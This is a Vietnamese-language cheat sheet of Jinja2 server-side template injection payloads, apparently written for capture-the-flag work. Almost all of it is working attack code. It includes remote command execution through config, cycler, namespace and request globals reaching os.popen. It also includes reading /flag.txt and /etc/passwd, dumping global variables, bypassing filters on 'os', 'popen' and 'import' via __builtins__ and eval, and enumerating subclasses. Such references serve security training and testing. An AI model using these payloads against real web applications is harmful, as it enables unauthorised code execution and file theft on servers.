# Jinja2 Template Injection Cheat Sheet

## 1. Các Object có sẵn (tuỳ web)

| Biến | Ý nghĩa | Tác dụng |
|------|---------|----------|
| `config` | Config Flask / Django | Có `os` trong `__globals__` |
| `cycler` | Object có sẵn | Có thể leak `__init__` hoặc `__class__` |
| `namespace` | Object có sẵn | Dùng được `__globals__` |
| `self` | Biến object hiện tại | Có `__class__` |
| `request` | Flask object | Có `application` → `__globals__` |

---

## 2. Payload RCE

### Truy cập os:
```python
{{ config.__class__.__init__.__globals__.os.popen('ls').read() }}
```

Nếu `config` không có → Dùng:
```python
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
{{ namespace.__init__.__globals__.os.popen('ls').read() }}
{{ request.application.__globals__.os.popen('ls').read() }}
```

---

## 3. Local File Read (LFI)

Ví dụ đọc flag:
```python
{{ namespace.__init__.__globals__.open('/flag.txt').read() }}
```

---

## 4. Leak Biến Toàn Cục

```python
{{ namespace.__init__.__globals__.keys() }}
{{ cycler.__init__.__globals__.keys() }}
```

---

## 5. Bypass Filter `os` hoặc `popen`

```python
{{ namespace.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

---

## 6. Bypass WAF filter `popen` hoặc `import`

Nếu bị chặn `popen`:
```python
{{ namespace.__init__.__globals__.os.system('ls') }}
```

Nếu chặn `import`:
```python
{{ eval('__import__("os").popen("ls").read()') }}
```

---

## 7. Thao Tác Biến Python

Leak version python:
```python
{{ namespace.__init__.__globals__.sys.version }}
```

---

## 8. Đọc file `/etc/passwd`:

```python
{{ namespace.__init__.__globals__.open('/etc/passwd').read() }}
```

---

## 9. Auto Scan Object trong Template:

```python
{{ ''.__class__.mro()[1].__subclasses__() }}
```

Tìm class:
```python
<class 'warnings.catch_warnings'>
<class 'os._wrap_close'>
```

---

## Tổng Kết

| Mục đích | Payload |
|----------|---------|
| RCE | `namespace.__init__.__globals__.os.popen('ls').read()` |
| LFI | `open('/flag').read()` |
| Leak key | `.__globals__.keys()` |
| Import thủ công | `__builtins__.__import__('os')` |
| Truy cập object | `request.application.__globals__` |
